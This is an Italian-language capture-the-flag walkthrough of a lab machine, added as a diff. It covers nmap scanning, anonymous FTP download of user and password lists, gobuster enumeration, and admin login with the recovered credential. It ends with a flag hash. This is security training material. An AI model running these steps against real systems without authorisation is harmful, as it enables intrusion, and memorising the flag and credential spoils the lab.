@@ -1,0 +1,116 @@
+IP: 10.129.139.153
+---------------
+scansiono il sistema
+
+sudo nmap 10.129.139.153 -sC -sV
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 05:09 EDT
+Nmap scan report for 10.129.139.153
+Host is up (0.032s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.16.58
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Unix
+
+vedo il servizio FTP aperto sulla porta 21 e un server web sulla 80, permette le connessioni anonime (riga 26)
+--------------------
+mi connetto tramite ftp
+
+ftp 10.129.139.153
+Connected to 10.129.139.153.
+220 (vsFTPd 3.0.3)
+Name (10.129.139.153:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+---------------------
+scarico i file presenti
+
+ftp> dir
+229 Entering Extended Passive Mode (|||45680|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+ftp> get allowed.userlist
+local: allowed.userlist remote: allowed.userlist
+229 Entering Extended Passive Mode (|||45650|)
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+100% |**********************************************************************|    33        0.44 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.17 KiB/s)
+ftp> get allowed.userlist.passwd
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+229 Entering Extended Passive Mode (|||42396|)
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+100% |**********************************************************************|    62        2.19 KiB/s    00:00 ETA
+226 Transfer complete.
+62 bytes received in 00:00 (0.38 KiB/s)
+-------------
+provo a loggarmi tramite ftp con le credenziali ottenute ma nessuna funziona
+------------
+installo il plugin Wappalyzer e vedi che il server usa php
+---------------
+sfrutto gobuster per cercare queste pagine specificando con -x php,html
+
+gobuster dir --url http://10.129.139.153/ --wordlist /home/kali/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.139.153/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html
+[+] Timeout:                 10s
+===============================================================
+2022/07/04 05:35:48 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 58565]
+/login.php            (Status: 200) [Size: 1577] 
+/assets               (Status: 301) [Size: 317] [--> http://10.129.139.153/assets/]
+/css                  (Status: 301) [Size: 314] [--> http://10.129.139.153/css/]   
+/js                   (Status: 301) [Size: 313] [--> http://10.129.139.153/js/]    
+/logout.php           (Status: 302) [Size: 0] [--> login.php]                      
+/config.php           (Status: 200) [Size: 0]                                      
+/fonts                (Status: 301) [Size: 316] [--> http://10.129.139.153/fonts/] 
+/dashboard            (Status: 301) [Size: 320] [--> http://10.129.139.153/dashboard/]
+                                                                                      
+===============================================================
+2022/07/04 05:36:46 Finished
+===============================================================
+
+tra le pagine più interessanti si trova login.php, navigo dal browser http://10.129.139.153/login.php
+-----------------
+provo le credenziali che ho trovato prima nei file ottenuti con FTP
+-----------------
+admin:rKXM59ESxesUFHAd funziona, mi si apre la schermata di gestione del sito
+-----------
+Here is your flag: c7110277ac44d78b6a9fff2232434d16
+
+
+
+
